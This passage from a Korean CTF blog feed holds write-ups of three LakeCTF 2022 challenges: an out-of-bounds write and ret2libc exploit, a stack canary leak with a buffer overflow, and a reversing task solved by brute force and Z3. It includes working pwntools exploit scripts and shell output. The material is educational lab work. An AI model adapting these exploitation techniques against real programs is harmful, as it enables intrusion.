class="line">0x7ffe3265c1e0:0x00007ffe3265c2400x0000562e91ec649e // 해당 함수가 끝나고 0x0000562e91ec649e로 감</span><br><span class="line">0x7ffe3265c1f0:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c200:0x80000000000068730x0000000000000000</span><br></pre></td></tr></table></figure><p>이 값들을 <code>get_gnomed</code> 함수를 거치면 아래와 같다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0x7ffe3265c040:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c050:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c060:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c070:0x80000000000068730x8000000000006873</span><br><span class="line">...</span><br><span class="line">0x7ffe3265c190:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c1a0:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c1b0:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c1c0:0xa3d3707cd6109c680xa614ed753417eb00 // 0x7ffe3265c1c8: canary</span><br><span class="line">0x7ffe3265c1d0:0x00000000000000000x0000000000000039</span><br><span class="line">0x7ffe3265c1e0:0x0000562e91ec649e0x00007f29d786a1d6 // 0x7ffe3265c1e8: ret address</span><br><span class="line">0x7ffe3265c1f0:0x00007f29d788ca400x00007f29d7a406c0 // 0x7ffe3265c1f0: system address</span><br><span class="line">0x7ffe3265c200:0x00007ffe3265c2400x0000000000000000</span><br></pre></td></tr></table></figure><p>현재 카나리는 <code>0x7ffe3265c1c8</code> 주소에 위치한다.</p><p>익스를 작성할 때 가장 까다로운 점은 카나리의 값이 랜덤이란 점이다. 이 위치가 바뀌면 당연하게도 <code>*** stack smashing detected ***: terminated</code>이 발생하는데, 카나리의 값은 랜덤이기 때문에 적당히 작은 수(음수?)이길 기대해야 한다. 이 때문에 익스 코드는 확률이 조금 있다.</p><p>그리고 <code>0x8000000000006873</code>가 보이는데 이는 <code>-9223372036854749069</code> 이다. 사실은 <code>sh</code>을 의도한 문자열이다. 왜 이렇게 줬을까?</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► 0x56310fe0d428 &lt;vuln+294&gt;    call   get_gnomed                &lt;get_gnomed&gt;</span><br><span class="line">       rdi: 0x7ffe3265c040 —▸ 0x7f4d54ba36c0 (_IO_2_1_stdout_) ◂— 0xfbad2887</span><br><span class="line">       rsi: 0x39</span><br><span class="line">       rdx: 0x39</span><br><span class="line">       rcx: 0x0</span><br></pre></td></tr></table></figure><p><code>get_gnomed</code> 함수를 호출할 떄 rdi의 값은 <code>0x7ffe3265c040</code>이다. 이 함수에서 <code>rdi</code>를 쓰지 않기 때문에 함수가 종료될 때도 rdi가 동일하다.</p><p>그렇단 뜻은 <code>system</code> 함수를 실행할 때 내가 원하는 매우 작은 값으로 <code>rdi</code>로 지정할 수 있단 뜻</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="시나리오"><a href="#시나리오" class="headerlink" title="시나리오"></a>시나리오</h3><ol><li>OOB write 트리거 위해 <code>cnt</code> 입력 시 48 입력</li><li><code>_IO_2_1_stdout_</code> 출력해주는 것을 이용하여 libc base 구하기</li><li>정렬할 값들을 적을 때(스택에 값을 적을 때) <code>cnt</code>를 더 큰 수로 하기 위해 맨 처음 57 입력 &lt;- OOB write 트리거 됨</li><li>스택에 페이로드 입력: ret 가젯 필요 (<code>movaps xmmword ptr [rsp + 0x50], xmm0</code>에서 멈추기 때문)</li><li>카나리의 위치가 제 위치에 온전히 있을 수 있도록 기도</li></ol><p>여담이지만 <code>ret</code> 주소가 <code>system</code> 주소보다 작게 구해졌기 때문에 이거에 대한 크기 고민은 하지 않았다.</p><h3 id="가젯-찾기"><a href="#가젯-찾기" class="headerlink" title="가젯 찾기"></a>가젯 찾기</h3><h4 id="ret"><a href="#ret" class="headerlink" title="ret"></a>ret</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@22:~/ctf/lake/porcosort2$ ROPgadget --binary libc.so.6 | grep &quot; : ret&quot;</span><br><span class="line">0x00000000000291d6 : ret</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./porcosort&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;chall.polygl0ts.ch&#x27;, 3900)</span></span><br><span class="line">e= ELF(<span class="string">&#x27;./porcosort&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;) </span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./ld-linux-x86-64.so.2&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = <span class="string">&#x27;&#x27;</span></span><br><span class="line">sh += <span class="string">&quot;sh\x00&quot;</span>.ljust(<span class="number">7</span>, <span class="string">&#x27;\x00&#x27;</span>) + <span class="string">&#x27;\x80&#x27;</span></span><br><span class="line">p.send(sh * <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(<span class="string">&#x27;0x&#x27;</span> + p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&#x27;leak :: &#x27;</span>+ <span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">libc_base = leak - libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;libc base :: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;sort? &#x27;</span>, <span class="built_in">str</span>(<span class="number">48</span>)) <span class="comment"># it caused an oob write</span></span><br><span class="line"></span><br><span class="line">ret = libc_base + <span class="number">0x291d6</span> <span class="comment">#0x29cd6</span></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = [<span class="number">57</span>, ret, system] <span class="comment"># 57: sort count overwriting</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span> - <span class="built_in">len</span>(payload)):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(-<span class="number">9223372036854749069</span>)) <span class="comment"># input 0x8000000000006873</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[*] leak :: 0x7fb8ce4466c0</span><br><span class="line">[*] libc base :: 0x7fb8ce247000</span><br><span class="line">[57, 140431709372886, 140431709514304]</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ id</span><br><span class="line">uid=1000(jail) gid=1000(jail) groups=1000(jail)</span><br><span class="line">$ ls</span><br><span class="line">flag</span><br><span class="line">run</span><br><span class="line">$ cat flag</span><br><span class="line">EPFL&#123;https://www.youtube.com/watch?v=2HjspVV0jK4&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Lake </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oob </tag>
            
            <tag> Dockerfile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LakeCTF 2022 - Attack on canary (canary)</title>
      <link href="/221003-lakectf2022-attack_on_canary/"/>
      <url>/221003-lakectf2022-attack_on_canary/</url>
      
        <content type="html"><![CDATA[<p>분석 환경: Windows 11, Ubuntu 20.04<br>사용자 제공 파일: 바이너리, 도커파일</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="보호-기법"><a href="#보호-기법" class="headerlink" title="보호 기법"></a>보호 기법</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h3 id="취약점"><a href="#취약점" class="headerlink" title="취약점"></a>취약점</h3><p>문제 제목에 나와있듯이 바이너리에 Canary가 있고 익스하는 데에 이것과 밀접하게 관련있을 것이다.</p><p>볼만한 함수는 딱 하나 있다. <code>vulnerable()</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    fflush(<span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your command: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot; %d&quot;</span>, &amp;v1);</span><br><span class="line">    <span class="keyword">if</span> ( v1 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Tell me which slot you wanna read: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">    write(<span class="number">1</span>, &amp;buf[<span class="number">8</span> * v1], <span class="number">8uLL</span>); <span class="comment">// 기능 1: canary leak</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v1 != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Tell me how much you wanna write: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What are the contents (max 8 bytes): &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, v1); <span class="comment">// 기능 2: bof</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Good&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>기능 1) 원하는 주소를 8바이트 읽을 수 있음 -&gt; canary leak<br>기능 2) 원하는 사이즈만큼 쓰기 가능함 -&gt; bof로 인한 rip 변경 가능</p><p>마침 win 함수가 존재하니 이 쪽으로 흐름을 돌리면 될 듯</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>원하는 주소를 읽을 수 있고 원하는 사이즈 만큼 쓰는 건 정말 강력한 것 같다.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./exe&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;chall.polygl0ts.ch&#x27;</span>, <span class="number">6100</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./exe&#x27;</span>)</span><br><span class="line"></span><br><span class="line">win = e.symbols[<span class="string">&#x27;win&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your command: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;you wanna read: &#x27;</span>, <span class="built_in">str</span>(<span class="number">11</span>))</span><br><span class="line"></span><br><span class="line">canary = u64(p.recv(<span class="number">8</span>)[:<span class="number">8</span>])</span><br><span class="line">log.info(<span class="string">&#x27;canary :: &#x27;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your command: &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;you wanna write: &#x27;</span>, <span class="built_in">str</span>(<span class="number">1000</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span> * <span class="number">88</span></span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(win)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;)&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[*] canary :: 0x53eaf0ab9b66a00</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">: Good</span><br><span class="line">Your command: $ </span><br><span class="line">$ id</span><br><span class="line">/bin/sh: 1: d: not found</span><br><span class="line">$ id</span><br><span class="line">uid=1000(jail) gid=1000(jail) groups=1000(jail)</span><br><span class="line">$ ls</span><br><span class="line">flag</span><br><span class="line">run</span><br><span class="line">$ cat flag</span><br><span class="line">EPFL&#123;this_is_clearly_a_fake_flag&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Lake </category>
          
      </categories>
      
      
        <tags>
            
            <tag> canary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LakeCTF 2022 - baby rev (rev, z3)</title>
      <link href="/221003-lakectf2022-baby_rev/"/>
      <url>/221003-lakectf2022-baby_rev/</url>
      
        <content type="html"><![CDATA[<p>분석 환경: Windows 11, Ubuntu 20.04<br>사용자 제공 파일: 바이너리, nc 접속 주소</p><p>평소에 리버싱 분야를 잘 풀지 않는데, 뭔가 오늘따라 풀어보고 싶어서 솔브가 많은 리버싱 하나 열어봤다.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>IDA로 열면 main함수가 있는데 대충 핵심적인 부분(밖에 없지만)을 가져오면 아래와 같다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__printf_chk(<span class="number">1LL</span>, <span class="string">&quot;What&#x27;s your your number:&quot;</span>, envp);</span><br><span class="line">fflush(_bss_start);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;input);</span><br><span class="line">v3 = <span class="number">0LL</span>;</span><br><span class="line">key = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> ( input - <span class="number">0x10000</span> &gt; <span class="number">0x7FFF0000</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_4;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  v5 = input &gt;&gt; v3++;</span><br><span class="line">  key = (v5 &amp; <span class="number">1</span>) + <span class="number">2</span> * key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v3 != <span class="number">0x20</span> );</span><br><span class="line"><span class="keyword">if</span> ( input == key )</span><br><span class="line">&#123;</span><br><span class="line">  v7 = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="comment">// print flag</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>사용자 입력을 받고 그 입력에 대해 ‘어떠한 연산’을 진행한 결과(key)와 비교해서 맞으면 flag를 출력해준다.</p><p>브루트 포싱을 하면 되지 않을까? 이 코드를 c로 옮겨서 브포해봐야겠다.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -o solve solve.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> input = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (input - <span class="number">0x10000</span> &lt; <span class="number">0x7fff0001</span>) &#123;</span><br><span class="line"><span class="type">int</span> key = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> v3 = <span class="number">0</span>; v3 &lt; <span class="number">0x20</span>; v5++) &#123;</span><br><span class="line">key = ((input &gt;&gt; v3) &amp; <span class="number">1</span>) + <span class="number">2</span> * key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (input == key) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, input);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">input++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>이런식으로 c로 코드를 옮기고 루프를 돌려주면 아래와 같이 <code>98304</code>라는 값이 나온다. 사실 이 문제 정답을 여러개인데 하나만 입력하면 flag를 던져주기 때문에 하나만 출력하고 바로 break를 해주었다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@ubuntu:~/ctf/lake/rev-baby$ ./solve </span><br><span class="line">98304</span><br><span class="line">jir4vvit@ubuntu:~/ctf/lake/rev-baby$ nc chall.polygl0ts.ch 3600</span><br><span class="line">What&#x27;s your your number:98304</span><br><span class="line">EPFL&#123;4ft3r_th15_h0w_h4rD_caN_r3V_8e?&#125;</span><br></pre></td></tr></table></figure><h2 id="More"><a href="#More" class="headerlink" title="More"></a>More</h2><p>이 문제를 파이썬 모듈인 <code>Z3 solver</code>를 이용하여 풀 수도 있다.</p><h3 id="Z3-solver"><a href="#Z3-solver" class="headerlink" title="Z3 solver"></a>Z3 solver</h3><p><code>Z3 solver</code>는 특정 값, 즉 정답을 찾아주는 SMT solver 모듈이라고 한다. (SMT: Satisfiability Modulo Theories)<br>어떠한 수식을 만족하는 값이 존재하는 지 찾아주는 건데, 존재한다면 그 값을 구해준다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x + y = 12</span><br><span class="line">x - y = 6</span><br></pre></td></tr></table></figure><p>예를 들어, 이런 연립방정식이 존재할 때, x와 y의 값을 <code>Z3 solver</code>가 구해줄 수 있다.<br>바로 아래와 같이..</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from z3 import *</span><br><span class="line">&gt;&gt;&gt; x = Int(&#x27;x&#x27;)</span><br><span class="line">&gt;&gt;&gt; y = Int(&#x27;y&#x27;)</span><br><span class="line">&gt;&gt;&gt; solve(x+y==12,x-y==6)</span><br><span class="line">[x = 9, y = 3]</span><br></pre></td></tr></table></figure><p>아래에 다운로드 방법과 여러 링크들을 남기고 Z3를 이용하여 이 문제를 어떻게 풀 수 있는지 알아보자.</p><h4 id="다운로드-방법"><a href="#다운로드-방법" class="headerlink" title="다운로드 방법"></a><strong>다운로드 방법</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install z3-solver</span><br></pre></td></tr></table></figure><p><a href="https://github.com/Z3Prover/z3">공식 github 링크</a><br><a href="https://ericpony.github.io/z3py-tutorial/guide-examples.htm">z3py-tutorial</a></p><h3 id="solve-with-Z3"><a href="#solve-with-Z3" class="headerlink" title="solve with Z3"></a>solve with Z3</h3><p>일단. 모듈을 가져오고 변수 두 개를 선언해야 한다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#ipt = Int(&#x27;ipt&#x27;)</span></span><br><span class="line">ipt = BitVec(<span class="string">&quot;ipt&quot;</span>, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#key = Int(&#x27;key&#x27;) # key is not variable</span></span><br><span class="line">key = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>실수들이.. 주석처리되어 있는데, 가장 처음 했던 실수는 사용자 인풋을 그냥 <code>Int()</code>로 정의한 점이다.<br><code>BitVec(&quot;&quot;, 비트수)</code>로 정의해야 한다. 왜냐하면 이 문제에서 사용자 인풋을 가지고 비트연산을 진행하는데 <code>Int()</code>로 선언하면 TypeError가 발생하기 때문이다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TypeError: unsupported operand type(s) for &gt;&gt;: &#x27;instance&#x27; and &#x27;int&#x27;</span><br></pre></td></tr></table></figure><p>그래서 비트연산을 할 때는 비트연산을 위한 <code>BitVec()</code>으로 선언을 해줘야 한다.</p><p>두 번째 했던 실수는 단순하다. 그냥 미지수 아닌데 미지수로 선언해줬다. 그러면 안된다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> v3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">32</span>):</span><br><span class="line">    key = ((ipt &gt;&gt; v3) &amp; <span class="number">1</span>) + <span class="number">2</span> * key</span><br></pre></td></tr></table></figure><p>파이썬으로 연산 코드를 작성해준다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(ipt - <span class="number">0x10000</span> &lt; <span class="number">0x7fff0001</span>)</span><br><span class="line">s.add(<span class="number">0</span> &lt; ipt)</span><br><span class="line">s.add(ipt == key)</span><br></pre></td></tr></table></figure><p><code>Z3 solver</code>는 <code>Solver</code> 객체를 지원해준다. 이 객체를 사용해보자. <code>s.add(수식)</code>로 ipt에 대한 제약 조건 및 값을 구하는 조건도 추가해줬다.</p><p><a href="https://z3prover.github.io/api/html/classz3py_1_1_solver.html">Sovler 객체 참고 링크</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> s.check() == sat:</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br><span class="line">    s.add(ipt != s.model()[ipt]) <span class="comment"># dupule check</span></span><br></pre></td></tr></table></figure><p><code>s.check()</code>는 해당 방적식을 만족하는 값(정답, 해)이 있는지 체크해준다. 값이 있으면 <code>sat</code>, 없으면 <code>unsat</code>, 해결할 수 없으면 <code>unknown</code>을 반환한다고 한다.</p><p>이 문제는 값이 여러 개가 나오므로 중복 체크도 해주었다. 방금 구한 ipt의 값을 제외한 다른 값을 구할 수 있다.</p><p><code>s.model()</code>은 <code>s.check()</code>가 <code>sat</code>일 때 만족하는 해 중 하나를 반환한다.</p><h4 id="최종-코드"><a href="#최종-코드" class="headerlink" title="최종 코드"></a><strong>최종 코드</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ipt = BitVec(<span class="string">&quot;ipt&quot;</span>, <span class="number">32</span>)</span><br><span class="line">key = <span class="number">0</span></span><br><span class="line"></span><br><span 